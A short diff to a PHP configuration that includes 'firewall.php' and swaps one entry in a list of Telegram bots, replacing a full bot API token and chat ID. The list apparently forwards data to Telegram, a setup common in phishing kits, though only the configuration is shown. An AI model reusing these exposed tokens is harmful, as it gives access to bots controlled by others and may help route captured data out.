@@ -16,8 +16,8 @@ include 'firewall.php';
             'chat_id' => '1325797388'
         ],
         [
-            'token' => '6559948089:AAFPgcZujs2vLPS9Ymvhqz5HOzwaIWoUZa4',
-            'chat_id' => '1749633126'
+            'token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U',
+            'chat_id' => '7339107338'
         ]
         // Add more bots here if needed
     ];
